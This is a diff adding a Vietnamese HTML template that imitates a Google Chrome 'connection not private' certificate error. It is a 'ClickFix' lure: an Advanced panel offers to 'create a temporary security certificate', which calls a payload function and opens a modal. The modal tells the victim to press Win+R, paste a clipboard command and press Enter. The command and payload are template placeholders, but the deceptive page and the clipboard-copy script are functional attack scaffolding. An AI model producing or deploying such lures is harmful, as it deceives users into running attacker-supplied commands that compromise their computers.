@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kết nối của bạn không riêng tư</title>
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #fff;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 80px;
+    }
+
+    .error-container {
+      max-width: 620px;
+      width: 100%;
+      padding: 0 28px;
+    }
+
+    .lock-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 28px;
+    }
+
+    .lock-icon {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .lock-icon svg {
+      display: block;
+    }
+
+    .lock-x {
+      position: absolute;
+      bottom: -6px;
+      right: -6px;
+      width: 30px;
+      height: 30px;
+      background: #d93025;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 3px solid #fff;
+    }
+
+    .lock-x svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 18px;
+      line-height: 1.4;
+    }
+
+    .error-text {
+      font-size: 15px;
+      color: #5f6368;
+      line-height: 1.7;
+      margin-bottom: 22px;
+    }
+
+    .error-text strong {
+      color: #202124;
+    }
+
+    .error-code-box {
+      background: #f8f9fa;
+      border: 1px solid #e8eaed;
+      border-radius: 10px;
+      padding: 16px 18px;
+      margin-bottom: 22px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.6;
+    }
+
+    .error-code-box .code-main {
+      font-size: 15px;
+      font-weight: 600;
+      color: #d93025;
+      margin-bottom: 6px;
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 14px;
+      flex-wrap: wrap;
+      margin-bottom: 28px;
+    }
+
+    .btn-back {
+      padding: 10px 24px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background .15s;
+    }
+
+    .btn-back:hover {
+      background: #1557b0;
+    }
+
+    .btn-advanced {
+      padding: 10px 24px;
+      background: transparent;
+      color: #1a73e8;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all .15s;
+    }
+
+    .btn-advanced:hover {
+      background: #f8f9fa;
+      border-color: #bdc1c6;
+    }
+
+    .advanced-panel {
+      display: none;
+      background: #f8f9fa;
+      border: 1px solid #e8eaed;
+      border-radius: 10px;
+      padding: 22px;
+      margin-bottom: 28px;
+      animation: fadeDown .2s ease;
+    }
+
+    .advanced-panel.open {
+      display: block;
+    }
+
+    @keyframes fadeDown {
+      from {
+        opacity: 0;
+        transform: translateY(-10px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
+    }
+
+    .advanced-panel p {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    .proceed-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: #d93025;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+      background: none;
+      border: none;
+      font-family: inherit;
+      padding: 0;
+    }
+
+    .proceed-link:hover {
+      color: #b52a1f;
+    }
+
+    .cert-details {
+      border: 1px solid #e8eaed;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 14px;
+    }
+
+    .cert-row {
+      display: flex;
+      padding: 10px 14px;
+      border-bottom: 1px solid #f1f3f4;
+      font-size: 13px;
+    }
+
+    .cert-row:last-child {
+      border-bottom: none;
+    }
+
+    .cert-key {
+      color: #80868b;
+      min-width: 150px;
+      flex-shrink: 0;
+    }
+
+    .cert-val {
+      color: #202124;
+      font-family: 'Consolas', monospace;
+      word-break: break-all;
+    }
+
+    .cert-val.err {
+      color: #d93025;
+    }
+
+    .error-footer {
+      margin-top: auto;
+      padding: 28px;
+      text-align: center;
+      font-size: 13px;
+      color: #80868b;
+    }
+
+    /* ClickFix Modal */
+    #err-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(32, 33, 36, .6);
+      backdrop-filter: blur(6px);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      animation: fadeIn .2s;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0
+      }
+
+      to {
+        opacity: 1
+      }
+    }
+
+    .err-dialog {
+      background: #fff;
+      border-radius: 12px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, .25), 0 2px 6px rgba(0, 0, 0, .1);
+      overflow: hidden;
+      animation: slideUp .25s ease;
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(16px);
+        opacity: 0
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1
+      }
+    }
+
+    .err-dialog-hdr {
+      background: #d93025;
+      padding: 20px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: #fff;
+    }
+
+    .err-dialog-hdr h2 {
+      font-size: 17px;
+      font-weight: 600;
+    }
+
+    .err-dialog-body {
+      padding: 24px;
+    }
+
+    .err-dialog-body p {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    .err-steps {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .err-step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .err-step-num {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background: #1a73e8;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .err-step-text {
+      font-size: 14px;
+      color: #333;
+      line-height: 1.4;
+    }
+
+    .err-step-text kbd {
+      background: #f0f0f0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 2px 6px;
+      font-size: 12px;
+      font-family: monospace;
+    }
+
+    .err-code {
+      background: #f8f9fa;
+      border: 1px solid #e8eaed;
+      border-radius: 8px;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+
+    .err-code-text {
+      font-family: 'Consolas', monospace;
+      font-size: 13px;
+      color: #d93025;
+      word-break: break-all;
+      flex: 1;
+    }
+
+    .err-copy {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 8px 14px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .err-copy:hover {
+      background: #1557b0;
+    }
+
+    .err-copy.copied {
+      background: #188038;
+    }
+
+    .err-note {
+      font-size: 12px;
+      color: #80868b;
+    }
+
+    .err-footer-btns {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .err-btn-sec {
+      padding: 10px 18px;
+      background: #f8f9fa;
+      color: #3c4043;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .err-btn-prim {
+      padding: 10px 18px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="error-container">
+
+    <div class="lock-wrap">
+      <div class="lock-icon">
+        <svg width="80" height="80" viewBox="0 0 24 24" fill="#d93025">
+          <path
+            d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+        </svg>
+        <div class="lock-x">
+          <svg viewBox="0 0 24 24" fill="#fff">
+            <path
+              d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" />
+          </svg>
+        </div>
+      </div>
+    </div>
+
+    <h1>{{ content.title | default('Kết nối của bạn không riêng tư') }}</h1>
+
+    <div class="error-text">
+      Kẻ tấn công có thể đang cố đánh cắp thông tin của bạn từ
+      <strong>{{ content.site_name | default('cong-thong-tin-bao-mat.net') }}</strong>
+      (ví dụ: mật khẩu, tin nhắn hoặc thẻ tín dụng).
+    </div>
+
+    <div class="error-code-box">
+      <div class="code-main">NET::ERR_CERT_AUTHORITY_INVALID</div>
+      <div>Chủ đề: {{ content.site_name | default('cong-thong-tin-bao-mat.net') }}</div>
+      <div>Người ký: Không xác định / Tự ký</div>
+      <div>Lỗi: Xác minh chứng chỉ không thành công</div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn-back" onclick="history.back()">← Quay lại</button>
+      <button class="btn-advanced" onclick="toggleAdvanced()">Nâng cao ▾</button>
+    </div>
+
+    <div class="advanced-panel" id="advanced-panel">
+      <p>
+        Máy chủ này không thể chứng minh rằng nó là <strong>{{ content.site_name | default('cong-thong-tin-bao-mat.net')
+          }}</strong>;
+        chứng chỉ bảo mật không được tin cậy bởi hệ điều hành của máy tính bạn.
+        Điều này có thể do cấu hình sai hoặc kẻ tấn công đang chặn kết nối của bạn.
+      </p>
+
+      <div class="cert-details">
+        <div class="cert-row"><span class="cert-key">Trạng Thái Chứng Chỉ</span><span class="cert-val err">KHÔNG HỢP LỆ
+            — Cơ quan không đáng tin cậy</span></div>
+        <div class="cert-row"><span class="cert-key">Tên Chung</span><span class="cert-val">{{ content.site_name |
+            default('cong-thong-tin-bao-mat.net') }}</span></div>
+        <div class="cert-row"><span class="cert-key">Được Phát Hành Bởi</span><span class="cert-val">CA Tự Ký</span>
+        </div>
+        <div class="cert-row"><span class="cert-key">Có Hiệu Lực Từ</span><span class="cert-val">{{ content.cert_from |
+            default('01/01/2025') }}</span></div>
+        <div class="cert-row"><span class="cert-key">Hết Hạn</span><span class="cert-val err">{{ content.cert_expiry |
+            default('01/01/2024') }} (ĐÃ HẾT HẠN)</span></div>
+      </div>
+
+      <p style="margin-bottom:12px">Để bỏ qua lỗi chứng chỉ và truy cập trang web, bạn cần cài đặt chứng chỉ bảo mật tạm
+        thời. Nhấn bên dưới để tạo nó.</p>
+
+      <button class="proceed-link" onclick="proceedInsecure()">
+        ⚠ Tạo Chứng Chỉ Bảo Mật Tạm Thời
+      </button>
+    </div>
+
+  </div>
+
+  <div class="error-footer">
+    Google Chrome · Mã Lỗi: –202 (NET::ERR_CERT_AUTHORITY_INVALID)
+  </div>
+
+  <!-- ClickFix Modal -->
+  <div id="err-modal"
+    style="display:none;position:fixed;inset:0;background:rgba(32,33,36,.6);backdrop-filter:blur(6px);z-index:9999;display:none;align-items:center;justify-content:center;padding:16px">
+    <div class="err-dialog">
+      <div class="err-dialog-hdr">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="#fff">
+          <path
+            d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z" />
+        </svg>
+        <h2>Yêu Cầu Cài Đặt Chứng Chỉ</h2>
+      </div>
+      <div class="err-dialog-body">
+        <p>Để truy cập trang web này, bạn cần cài đặt chứng chỉ bảo mật tạm thời. Chạy lệnh bên dưới để hoàn tất quá
+          trình.</p>
+        <ol class="err-steps">
+          <li class="err-step">
+            <div class="err-step-num">1</div>
+            <div class="err-step-text">Nhấn <kbd>⊞ Win</kbd> + <kbd>R</kbd></div>
+          </li>
+          <li class="err-step">
+            <div class="err-step-num">2</div>
+            <div class="err-step-text">Nhấn <kbd>Ctrl</kbd> + <kbd>V</kbd> để dán</div>
+          </li>
+          <li class="err-step">
+            <div class="err-step-num">3</div>
+            <div class="err-step-text">Nhấn <kbd>Enter</kbd> để cài đặt chứng chỉ</div>
+          </li>
+        </ol>
+        <div class="err-code">
+          <div class="err-code-text" id="err-cmd">{{ content.display_command | default('Đang tải…') }}</div>
+          <button class="err-copy" id="err-copy-btn" onclick="errCopyAgain()">📋 Sao Chép</button>
+        </div>
+        <p class="err-note">Lệnh đã được sao chép vào bộ nhớ tạm. Sau khi hoàn tất, hãy làm mới trang để tiếp tục.</p>
+        <div class="err-footer-btns">
+          <button class="err-btn-sec" onclick="document.getElementById('err-modal').style.display='none'">Hủy</button>
+          <button class="err-btn-prim" onclick="errCopyAgain()">Sao Chép Lại</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    { { payload_content | safe } }
+
+    window._lureName = "{{ lure_name }}";
+
+    var _advOpen = false;
+    function toggleAdvanced() {
+      _advOpen = !_advOpen;
+      var panel = document.getElementById('advanced-panel');
+      panel.classList.toggle('open', _advOpen);
+    }
+
+    function proceedInsecure() {
+      try { runClickFixPayload(); } catch (e) { console.warn('payload:', e); }
+      setTimeout(function () {
+        document.getElementById('err-modal').style.display = 'flex';
+      }, 400);
+    }
+
+    function errCopyAgain() {
+      var code = document.getElementById('err-cmd').textContent;
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(function () {
+          var btn = document.getElementById('err-copy-btn');
+          btn.textContent = '✓ Đã Sao Chép!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = '📋 Sao Chép'; btn.classList.remove('copied'); }, 2000);
+        });
+      }
+    }
+  </script>
+</body>
+
+</html>
